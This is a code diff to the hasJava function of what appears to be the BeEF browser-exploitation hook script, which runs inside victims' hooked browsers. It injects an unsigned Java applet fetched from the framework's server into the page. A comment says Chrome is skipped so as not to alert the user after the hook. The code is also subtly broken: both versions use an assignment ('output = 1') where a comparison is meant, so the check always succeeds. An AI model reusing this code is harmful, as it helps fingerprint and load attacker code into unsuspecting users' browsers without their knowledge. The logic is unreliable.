@@ -502,14 +502,14 @@ beef.browser = {
  	
 	hasJava: function() {
 		if(!this.type().IE && window.navigator.javaEnabled && window.navigator.javaEnabled()) {
-			//If chrome detected, return false.  Do not run java applet
-	                if(beef.browser.isC()){
-				return false;
+			// if Chrome is detected, return true without injecting the unsigned applet.
+            // latest versions of Chrome requires manual user intervention even with unsigned applets,
+            // so basically we don't want to alert the user after the initial hook.
+	        if(beef.browser.isC()){
+				return true;
 
-			}
-			
-			else{
-				//Create java applet here and test for execution
+			}else{
+				//inject an unsigned java applet to double check if the Java plugin is working fine.
 				var applet_archive = 'http://'+beef.net.host+ ':' + beef.net.port + '/demos/checkJava.jar';
     				var applet_id = 'checkJava';
     				var applet_name = 'checkJava';
@@ -518,12 +518,7 @@ beef.browser = {
   					null, applet_archive, null);
     				output = document.Microsoft_Corporation.getInfo();
 				beef.dom.detachApplet('checkJava');
-				if(output=1){
-					return true;
-				}
-				else{
-					return false;
-				}
+				return output = 1;
 			}	
 		}return false;
 	},
